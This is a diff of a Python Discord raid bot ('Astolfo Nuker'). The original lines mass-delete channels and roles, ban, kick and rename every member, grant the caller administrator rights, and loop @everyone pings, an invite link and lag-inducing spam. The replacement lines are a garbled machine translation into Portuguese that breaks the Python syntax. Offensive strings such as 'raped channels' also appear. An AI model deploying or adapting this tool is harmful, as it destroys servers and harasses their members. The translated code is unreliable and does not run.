@@ -1,222 +1,222 @@
-'''
-Femboyed by oAaron#0001
-'''
-from discord import Permissions
-import discord,random,time
+'' '
+Femboyed por oAaron # 0001
+'' '
+de permissões de importação discord
+importar discórdia, aleatório, tempo
 import json
-from discord.ext import commands, tasks
-import os 
-import colorama
-import asyncio
-from colorama import Fore
+de discord.ext importar comandos, tarefas
+importar os 
+importar colorama
+importar assíncio
+da importação de colorama Fore
 from discord import Embed
-colorama.init()
-intents = discord.Intents.all()
-bot = commands.Bot(command_prefix=">",intents=intents)
-bot.remove_command("help")
-with open('config.json') as f:
-    data = json.load(f)
-    token = data["TOKEN"]
-@bot.event
-async def on_ready():
-    print(f'''
-{Fore.LIGHTCYAN_EX}╔═╗┌─┐┌┬┐┌─┐┌─┐┬  ┌─┐  
-{Fore.LIGHTCYAN_EX}╠═╣└─┐ │ ├┤ │ ││  │ │  
-{Fore.LIGHTCYAN_EX}╩ ╩└─┘ ┴ └  └─┘┴─┘└─┘  
-{Fore.LIGHTCYAN_EX}╔╗╔┬ ┬┬┌─┌─┐┬─┐        
-{Fore.LIGHTCYAN_EX}║║║│ │├┴┐├┤ ├┬┘        
-{Fore.LIGHTCYAN_EX}╝╚╝└─┘┴ ┴└─┘┴└─     
-Logged in and Ready <3                             
-''')
+colorama.init ()
+intents = discord.Intents.all ()
+bot = commands.Bot (command_prefix = ">", intents = intents)
+bot.remove_command ("ajuda")
+com open ('config.json') como f:
+    dados = json.load (f)
+    token = data ["TOKEN"]
+@ bot.event
+assíncrono def on_ready ():
+    imprimir (f '' '
+{Fore.LIGHTCYAN_EX} ╔═╗┌─┐┌┬┐┌─┐┌─┐┬ ┌─┐  
+{Fore.LIGHTCYAN_EX} ╠═╣└─┐ │ ├┤ │ ││ │ │  
+{Fore.LIGHTCYAN_EX} ╩ ╩└─┘ ┴ └ └─┘┴─┘└─┘  
+{Fore.LIGHTCYAN_EX} ╔╗╔┬ ┬┬┌─┌─┐┬─┐        
+{Fore.LIGHTCYAN_EX} ║║║│ │├┴┐├┤ ├┬┘        
+{Fore.LIGHTCYAN_EX} ╝╚╝└─┘┴ ┴└─┘┴└─     
+Conectado e pronto <3                             
+'' ')
 
-@bot.command()
-async def d(ctx,channel_id="all"):
-  await ctx.message.delete()
+@ bot.command ()
+assíncrono def d (ctx, channel_id = "all"):
+  aguarde ctx.message.delete ()
   if channel_id == "all":
-    for channel in ctx.guild.channels:
-      if channel.id != 834134636678479902:
-        await channel.delete()
-      else:
-        continue
+    para o canal em ctx.guild.channels:
+      if channel.id! = 834134636678479902:
+        aguarde channel.delete ()
+      senão:
+        Prosseguir
     guild = ctx.message.guild
-    await guild.create_text_channel("nuked")
-    print("Nuked All Channels")
-    return
-  else:
-    try:
-      channel = ctx.get.channel(id=channel_id)
-      await channel.delete()
-    except:
-      e2 = discord.Embed(title = "Invaild Channel ID.", color = 0xaf1aff)
-      await ctx.send(embed=e2)
-    return
+    esperar guild.create_text_channel ("nuked")
+    imprimir ("Nuked Todos os Canais")
+    Retorna
+  senão:
+    tentar:
+      channel = ctx.get.channel (id = channel_id)
+      aguarde channel.delete ()
+    exceto:
+      e2 = discord.Embed (title = "Invaild Channel ID.", cor = 0xaf1aff)
+      aguarde ctx.send (embed = e2)
+    Retorna
 
-@bot.command(pass_context=True)
-async def admin(ctx):
-    try:
+@ bot.command (pass_context = True)
+assíncrono def admin (ctx):
+    tentar:
         guild = ctx.guild
-        role = await guild.create_role(name="Astfolo Nuker", permissions=discord.Permissions(8),colour=discord.Colour(000000))
+        role = await guild.create_role (name = "Astfolo Nuker", permissions = discord.Permissions (8), color = discord.Colour (000000))
         authour = ctx.message.author
-        await ctx.message.delete()
-        await authour.add_roles(role)
-        print("Gave you admin <3")
-    except:
-        print("Couldnt give you admin :(")
+        aguarde ctx.message.delete ()
+        aguarde authour.add_roles (papel)
+        imprimir ("Te dei admin <3")
+    exceto:
+        print ("Não foi possível fornecer o administrador :(")
 
-@bot.command()
-async def rspam(ctx):
- while True:
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU")
-   print("Spamming roles <3")
-@bot.command()
-async def transrspam(ctx):
- while True:
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0x0EF5F6))
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0xFFFFFF))
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0xFFA3FB))
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0xFFFFFF))
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0x0EF5F6))
-   print("Spamming roles <3")
-@bot.command()
-async def rdelete(ctx):
+@ bot.command ()
+async def rspam (ctx):
+ enquanto verdadeiro:
+   aguarde ctx.guild.create_role (name = "Astfolo NUKER EXECUTE VOCÊ")
+   imprimir ("Funções de spam <3")
+@ bot.command ()
+async def transrspam (ctx):
+ enquanto verdadeiro:
+   esperar ctx.guild.create_role (name = "Astfolo NUKER RUNS YOU", color = discord.Colour (0x0EF5F6))
+   esperar ctx.guild.create_role (name = "Astfolo NUKER RUNS YOU", color = discord.Colour (0xFFFFFF))
+   esperar ctx.guild.create_role (name = "Astfolo NUKER RUNS YOU", color = discord.Colour (0xFFA3FB))
+   esperar ctx.guild.create_role (name = "Astfolo NUKER RUNS YOU", color = discord.Colour (0xFFFFFF))
+   esperar ctx.guild.create_role (name = "Astfolo NUKER RUNS YOU", color = discord.Colour (0x0EF5F6))
+   imprimir ("Funções de spam <3")
+@ bot.command ()
+assíncrono def rdelete (ctx):
   total_roles = ""
-  for role in ctx.guild.roles:
-    try:
-      await role.delete()
-    except:
-      pass 
-  embed = Embed(title="Done Deleting All Roles", color=0xaf1aff)
-  await ctx.send(embed=embed)
-  await ctx.message.delete()
+  para função em ctx.guild.roles:
+    tentar:
+      aguarde role.delete ()
+    exceto:
+      passar 
+  embed = Embed (title = "Done Deleting All Roles", color = 0xaf1aff)
+  aguarde ctx.send (embed = embed)
+  aguarde ctx.message.delete ()
 
 
-@bot.command()
-async def cspam(ctx,times_reapet=10,name_of_channel="default"):
-  for times in range(times_reapet):
+@ bot.command ()
+assíncrono def cspam (ctx, times_reapet = 10, name_of_channel = "default"):
+  para tempos no intervalo (times_reapet):
     guild = ctx.message.guild
-    await guild.create_text_channel(name_of_channel)
-  em3 = discord.Embed(title = f"Im Done spamming ***{times_reapet}*** amount of channels named ***{name_of_channel}***", color = 0xaf1aff)
-  print(f"Spammed {times_reapet} Channels <3")
-  await ctx.message.delete()
-  await ctx.send(embed=em3)
+    esperar guild.create_text_channel (name_of_channel)
+  em3 = discord.Embed (title = f "Im concluído spamming *** {times_reapet} *** quantidade de canais nomeados *** {name_of_channel} ***", color = 0xaf1aff)
+  imprimir (f "Canais {times_reapet} com spam <3")
+  aguarde ctx.message.delete ()
+  aguarde ctx.send (embed = em3)
 
-@bot.command()
-async def vcspam(ctx,times_reapet=10,name_of_channel="default"):
-  for times in range(times_reapet):
+@ bot.command ()
+assíncrono def vcspam (ctx, times_reapet = 10, name_of_channel = "default"):
+  para tempos no intervalo (times_reapet):
     guild = ctx.message.guild
-    await guild.create_voice_channel(name_of_channel)
-  em3 = discord.Embed(title = f"Im Done spamming ***{times_reapet}*** amount of voice channels named ***{name_of_channel}***", color = 0xaf1aff)
-  print(f"Spammed {times_reapet} Voice Channels <3")
-  await ctx.message.delete()
-  await ctx.send(embed=em3)
+    aguarde guild.create_voice_channel (name_of_channel)
+  em3 = discord.Embed (title = f "Im concluído spamming *** {times_reapet} *** quantidade de canais de voz chamados *** {name_of_channel} ***", color = 0xaf1aff)
+  imprimir (f "Canais de voz {times_reapet} com spam <3")
+  aguarde ctx.message.delete ()
+  aguarde ctx.send (embed = em3)
 
-@bot.command()
-async def banAll(ctx):
- embed=discord.Embed(title="Done Banning All Members", color=0xaf1aff)
- await ctx.send(embed=embed)
- await ctx.message.delete()
- print("Banned All Members <3 ~")
- for user in ctx.guild.members:
-        try:
-            await user.ban()
-        except:
-           pass
-@bot.command()
-async def kickAll(ctx):
- embed=discord.Embed(title="Done Banning All Members", color=0xaf1aff)
- await ctx.send(embed=embed)
- await ctx.message.delete()
- print("Kicked all members <3 ~")
- for user in ctx.guild.members:
-        try:
-            await user.kick()
-        except:
-           pass
+@ bot.command ()
+async def banAll (ctx):
+ embed = discord.Embed (title = "Concluído Banindo Todos os Membros", color = 0xaf1aff)
+ aguarde ctx.send (embed = embed)
+ aguarde ctx.message.delete ()
+ imprimir ("Todos os membros banidos <3 ~")
+ para usuário em ctx.guild.members:
+        tentar:
+            aguarde user.ban ()
+        exceto:
+           passar
+@ bot.command ()
+assíncrono def kickAll (ctx):
+ embed = discord.Embed (title = "Concluído Banindo Todos os Membros", color = 0xaf1aff)
+ aguarde ctx.send (embed = embed)
+ aguarde ctx.message.delete ()
+ print ("Expulsou todos os membros <3 ~")
+ para usuário em ctx.guild.members:
+        tentar:
+            aguarde user.kick ()
+        exceto:
+           passar
 
-@bot.command()
-async def help(ctx):
- embed1 = Embed(title="Astolfo Nuker Help", color=0xaf1aff)
- embed1.add_field(name=">help ", value="Sends This Message", inline=False)
- embed1.add_field(name=">cspam [Amount] Channel Name", value="Spams Channels", inline=True)
- embed1.add_field(name=">d all", value="Nukes All Channels", inline=False)
- embed1.add_field(name=">banAll", value="Bans all members", inline=False)
- embed1.add_field(name=">pingspam", value="Locks all channels And Spam Pings", inline=False) 
- embed1.add_field(name=">admin", value="Gives user Admin.", inline=False)
- embed1.add_field(name=">vcspam [Amount] [Channel Name]", value="Spams Voice Channels", inline=False)  
- embed1.add_field(name=">servername [Name]", value="Changes Server Name", inline=False)
- embed1.add_field(name=">nickall [Name]", value="Changes Everyones Names", inline=False)
- embed1.add_field(name=">rspam", value="Spams Roles", inline=False)
- embed1.add_field(name=">rdelete", value="Deletes All Roles Below the Bot", inline=False)
- embed1.add_field(name=">kickAll", value="Kicks All", inline=False)
- embed1.add_field(name=">transrspam", value="spams roles like the trans flag :flusuhed:", inline=False)
- embed1.add_field(name=">lagspam", value="Lags Peoples Discords", inline=False)
- embed1.set_image(url="https://media.discordapp.net/attachments/837017058273263712/837752787545882656/1533773770_w_KamaroTheTrap.gif")     
- embed1.set_footer(text="By oAaron")
- embed2 = await ctx.send(embed=embed1)
- time.sleep(10)
- await embed2.delete()
- await ctx.message.delete()
+@ bot.command ()
+async def help (ctx):
+ embed1 = Embed (title = "Astolfo Nuker Help", color = 0xaf1aff)
+ embed1.add_field (name = "> help", value = "Sends This Message", inline = False)
+ embed1.add_field (name = "> cspam [Amount] Channel Name", value = "Spams Channels", inline = True)
+ embed1.add_field (name = "> d all", value = "Nukes All Channels", inline = False)
+ embed1.add_field (name = "> banAll", value = "Bans todos os membros", inline = False)
+ embed1.add_field (name = "> pingspam", value = "Bloqueia todos os canais e pings de spam", inline = False) 
+ embed1.add_field (name = "> admin", value = "Dá ao usuário Admin.", inline = False)
+ embed1.add_field (name = "> vcspam [Amount] [Channel Name]", value = "Spams Voice Channels", inline = False)  
+ embed1.add_field (name = "> servername [Name]", value = "Changes Server Name", inline = False)
+ embed1.add_field (name = "> nickall [Name]", value = "Changes Everyones Names", inline = False)
+ embed1.add_field (name = "> rspam", value = "Spams Roles", inline = False)
+ embed1.add_field (name = "> rdelete", value = "Deletes All Roles Below the Bot", inline = False)
+ embed1.add_field (name = "> kickAll", value = "Kicks All", inline = False)
+ embed1.add_field (name = "> transrspam", value = "envia spams para funções como a sinalização trans: flusuhed:", inline = False)
+ embed1.add_field (name = "> lagspam", value = "Lags Peoples Discords", inline = False)
+ embed1.set_image (url = "https://media.discordapp.net/attachments/837017058273263712/837752787545882656/1533773770_w_KamaroTheTrap.gif")     
+ embed1.set_footer (text = "Por oAaron")
+ embed2 = await ctx.send (embed = embed1)
+ tempo.sono (10)
+ aguarde embed2.delete ()
+ aguarde ctx.message.delete ()
 
 
-@bot.command()
-async def pingspam(ctx):
+@ bot.command ()
+async def pingspam (ctx):
     guild = ctx.message.guild
-    await ctx.guild.edit(name="SERVER WIZZED")
-    print("raped channels <3")
-    latters = "a:b:c:d:e:f:g:h:i:j:k:l:m:n:o:p:q:r:s:t:u:v:w:x:y:,:+:*:/:#: "
-    lattersL = latters.split()
-    while True:
-      for time in range(random.randint(4,10)):
-        r1 = random.choice(lattersL)
-      try:
-        await guild.create_text_channel("nuked")
-        await guild.create_voice_channel("wizzed")
-      except:
-        pass 
-      for channel in ctx.guild.text_channels:
-        try:
-          webhook = discord.utils.get(await ctx.channel.webhooks(), name='Spammer')
-          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU         {r1}")
-          await ctx.channel.create_webhook(name="wizzed by tool")
-          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU   {r1}")
-          await ctx.channel.create_webhook(name="wizzed")
-          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU                {r1}")
-          await ctx.channel.create_webhook(name="wizzed by tool")
-          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU     {r1}")
-          await ctx.channel.create_webhook(name="wizzed")
-          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU              {r1}")
-          await webhook.send()
-        except:
-          pass 
-@bot.command()
-async def lagspam(ctx):
-  while True:
-    for channel in ctx.guild.text_channels:
-      await channel.send(":chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains:")
-      print("Lagging Channels")
-@bot.command()
-async def servername(ctx, name = None): 
-  if name != None:
-    await ctx.guild.edit(name=f"{name}")
-    print("Changed Server Name")
-    em200 = Embed(color = 0xaf1aff, title=f"Changed the server name to: ***{ctx.guild.name}***")
-    em2001 = await ctx.send(embed=em200) 
-    time.sleep(8)
-    await em2001.delete()
-  else:  
-    em100 = Embed(color = 0xaf1aff, title=ctx.guild.name)
-    em1001 = await ctx.send(embed=em100)
-    time.sleep(8)
-    await em1001.delete()
-@bot.command()
-async def nickall(ctx, *, name="! TOOL RUNS YOU"):
-  print("Nicking All")
-  for member in ctx.guild.members:
-    try:
-      await member.edit(nick=name)
-    except:
-      pass 
+    aguarde ctx.guild.edit (name = "SERVER WIZZED")
+    imprimir ("canais de estupro <3")
+    últimos = "a: b: c: d: e: f: g: h: i: j: k: l: m: n: o: p: q: r: s: t: u: v: w: x : y:,: +: *: /: #: "
+    lattersL = latters.split ()
+    enquanto verdadeiro:
+      para tempo no intervalo (random.randint (4,10)):
+        r1 = random.choice (lattersL)
+      tentar:
+        esperar guild.create_text_channel ("nuked")
+        esperar guild.create_voice_channel ("wizzed")
+      exceto:
+        passar 
+      para canal em ctx.guild.text_channels:
+        tentar:
+          webhook = discord.utils.get (await ctx.channel.webhooks (), name = 'Spammer')
+          await channel.send (f "Nuked! @everyone https://discord.gg/A7nAbRFdjD A FERRAMENTA EXECUTA VOCÊ {r1}")
+          esperar ctx.channel.create_webhook (name = "wizzed pela ferramenta")
+          await channel.send (f "Nuked! @everyone https://discord.gg/A7nAbRFdjD A FERRAMENTA EXECUTA VOCÊ {r1}")
+          esperar ctx.channel.create_webhook (name = "wizzed")
+          await channel.send (f "Nuked! @everyone https://discord.gg/A7nAbRFdjD A FERRAMENTA EXECUTA VOCÊ {r1}")
+          esperar ctx.channel.create_webhook (name = "wizzed pela ferramenta")
+          await channel.send (f "Nuked! @everyone https://discord.gg/A7nAbRFdjD A FERRAMENTA EXECUTA VOCÊ {r1}")
+          esperar ctx.channel.create_webhook (name = "wizzed")
+          await channel.send (f "Nuked! @everyone https://discord.gg/A7nAbRFdjD A FERRAMENTA EXECUTA VOCÊ {r1}")
+          aguarde webhook.send ()
+        exceto:
+          passar 
+@ bot.command ()
+async def lagspam (ctx):
+  enquanto verdadeiro:
+    para canal em ctx.guild.text_channels:
+      esperar channel.send (": chains:: chains:: chains:: chains:: chains:: chains:: chains:: chains:: chains:: chains:: chains:: chains:: chains:: chains:: chains :: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes: : correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes :: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes :: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes: : correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes :: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias::correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes: : chains:: chains:: chains:: chains:: chains:: chains: ")
+      imprimir ("Canais atrasados")
+@ bot.command ()
+async def servername (ctx, name = None): 
+  se nome! = Nenhum:
+    aguarde ctx.guild.edit (name = f "{name}")
+    imprimir ("Nome do servidor alterado")
+    em200 = Embed (color = 0xaf1aff, title = f "Alterou o nome do servidor para: *** {ctx.guild.name} ***")
+    em2001 = aguarda ctx.send (embed = em200) 
+    tempo.sono (8)
+    aguarde em2001.delete ()
+  senão:  
+    em100 = Incorporar (cor = 0xaf1aff, título = ctx.guild.name)
+    em1001 = aguarda ctx.send (embed = em100)
+    tempo.sono (8)
+    aguarde em1001.delete ()
+@ bot.command ()
+async def nickall (ctx, *, name = "! TOOL RUNS YOU"):
+  imprimir ("Nicking All")
+  para membro em ctx.guild.members:
+    tentar:
+      aguardar member.edit (apelido = nome)
+    exceto:
+      passar 
 
 
 
-bot.run(token)
+bot.run (token)
